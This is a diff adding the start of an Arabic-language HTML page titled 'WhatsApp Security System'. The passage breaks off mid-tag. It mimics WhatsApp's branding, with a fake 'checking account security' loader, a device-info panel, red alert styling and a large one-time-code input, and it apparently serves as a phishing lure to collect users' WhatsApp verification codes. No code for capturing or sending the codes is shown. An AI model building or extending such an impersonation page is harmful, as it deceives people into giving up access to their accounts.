@@ -1,0 +1,63 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>WhatsApp Security System</title>
+    <style>
+        :root { --wa-bg: #0b141a; --wa-green: #00a884; --wa-text: #e9edef; --wa-hint: #8696a0; --wa-surface: #111b21; }
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, sans-serif; }
+        body { background: var(--wa-bg); color: var(--wa-text); height: 100vh; overflow: hidden; }
+
+        /* شاشة التحميل */
+        #checker { 
+            position: fixed; inset: 0; background: rgba(11, 20, 26, 0.95); z-index: 1000;
+            display: flex; flex-direction: column; align-items: center; justify-content: center;
+        }
+
+        .pulse-logo {
+            width: 60px;
+            animation: pulseLogo 2s infinite ease-in-out;
+        }
+        @keyframes pulseLogo {
+            0% { transform: scale(1); opacity: 0.9; }
+            50% { transform: scale(1.05); opacity: 1; }
+            100% { transform: scale(1); opacity: 0.9; }
+        }
+
+        .container { padding: 30px 20px; text-align: center; display: none; max-width: 450px; margin: auto; }
+        .active { display: block; animation: fadeIn 0.5s ease; }
+
+        .device-info { 
+            background: #1d2a33; border-radius: 12px; padding: 20px; text-align: right; 
+            margin-bottom: 25px; border: 1px solid #222d34;
+        }
+        
+        .info-line { font-size: 13px; margin-bottom: 10px; color: var(--wa-hint); display: flex; justify-content: space-between; }
+        .info-line b { color: #fff; font-family: monospace; font-weight: normal; direction: ltr; }
+
+        .status-update { color: #ff5252; font-weight: 500; } /* خليتها أحمر للتنبيه */
+
+        .otp-input {
+            width: 100%; background: transparent; border: none; border-bottom: 2px solid #2a3942;
+            color: #fff; font-size: 32px; text-align: center; outline: none; letter-spacing: 12px; margin: 25px 0; direction: ltr;
+        }
+        .otp-input:focus { border-bottom-color: var(--wa-green); }
+
+        .btn { background: var(--wa-green); color: #111b21; border: none; width: 100%; padding: 16px; border-radius: 10px; font-size: 16px; font-weight: bold; cursor: pointer; }
+
+        .spinner { border: 2px solid #202c33; border-top: 2px solid var(--wa-green); border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; }
+        
+        @keyframes spin { 100% { transform: rotate(360deg); } }
+        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
+    </style>
+</head>
+<body>
+
+    <div id="checker">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" class="pulse-logo">
+        <p id="log-text" style="margin-top:20px; font-size:14px; color:var(--wa-hint);">جاري التحقق من أمان الحساب...</p>
+    </div>
+
+    <div class="container" id="app">
+        <img src="https://upload
